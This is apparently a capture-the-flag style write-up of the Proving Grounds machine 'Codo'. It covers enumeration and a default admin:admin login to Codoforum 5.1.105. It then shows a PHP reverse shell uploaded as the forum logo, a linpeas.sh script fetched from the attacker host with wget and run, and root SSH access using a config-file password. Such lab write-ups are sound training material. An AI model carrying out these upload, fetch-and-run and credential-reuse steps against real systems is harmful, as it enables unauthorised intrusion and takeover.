## Enumeration

```bash
(kali㉿kali)-[~/…/oscp/PG/practice/Codo]
└─$ nmap -A 192.168.196.23 -oN initial.scan
Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-04 18:03 EST
Nmap scan report for 192.168.196.23
Host is up (0.078s latency).
Not shown: 998 filtered tcp ports (no-response)
Bug in http-generator: no string output.
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 62:36:1a:5c:d3:e3:7b:e1:70:f8:a3:b3:1c:4c:24:38 (RSA)
|   256 ee:25:fc:23:66:05:c0:c1:ec:47:c6:bb:00:c7:4f:53 (ECDSA)
|_  256 83:5c:51:ac:32:e5:3a:21:7c:f6:c2:cd:93:68:58:d8 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: All topics | CODOLOGIC
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

```bash
(kali㉿kali)-[~/…/oscp/PG/practice/Codo]
└─$ whatweb 192.168.196.23                 
http://192.168.196.23 [200 OK] Apache[2.4.41], Cookies[PHPSESSID,cf], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[192.168.196.23], Open-Graph-Protocol[website], Script[javascipt,text/html,text/javascript], Title[All topics | CODOLOGIC], X-UA-Compatible[IE=edge]
```

By browsing to the site we can see its sort of forum "codoforum" we try to login with admin:admin and it works!!

```bash
(kali㉿kali)-[~]
└─$ ffuf -u http://192.168.196.23/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.196.23/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

# Copyright 2007 James Fisher [Status: 200, Size: 45225, Words: 18868, Lines: 1046, Duration: 98ms]
# directory-list-2.3-big.txt [Status: 200, Size: 45225, Words: 18868, Lines: 1046, Duration: 101ms]
#                       [Status: 200, Size: 45225, Words: 18868, Lines: 1046, Duration: 871ms]
admin                   [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 75ms]
```
with ffuf we found admin page, there we see login that we already found (admin:admin).

now we can see it is codoforum version "V.5.1.105" 
![[Pasted image 20240105012750.png]]

Searching in google for codoforum version 5.1.105 exploits we found a php file inclusion in the logo (admin panel > global settings > change forum logo).
so we create a php rev shell with the web extension hack-tools and upload it to the logo then we start nc on port 80 and browse to "192.168.196.23/sites/default/assets/img/attachments/shell.php"
![[Pasted image 20240105020051.png]]
<center><font color="#c00000">we get the rev shell!</font></center>

now lets upgrade our shell:
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
^Z
stty raw -echo;fg
export TERM=xterm
```

now lets get "linpeas.sh" to the host and run it:

```bash
(kali㉿kali)-[~/Desktop/scripts_explloits]
└─$ python3 -m http.server 8080
```
<center>Host</center>

```bash
www-data@codo:/home/offsec$ cd /tmp
www-data@codo:/tmp$ wget 192.168.45.185:8080/linpeas.sh
www-data@codo:/tmp$ chmod +x linpeas.sh
www-data@codo:/tmp$ ./linpeas.sh
```

and linpeas found password for in config php file.
![[Pasted image 20240105022429.png]]
'password' => 'FatPanda123'

now with this password we can ssh to root user 
![[Pasted image 20240105023845.png]]
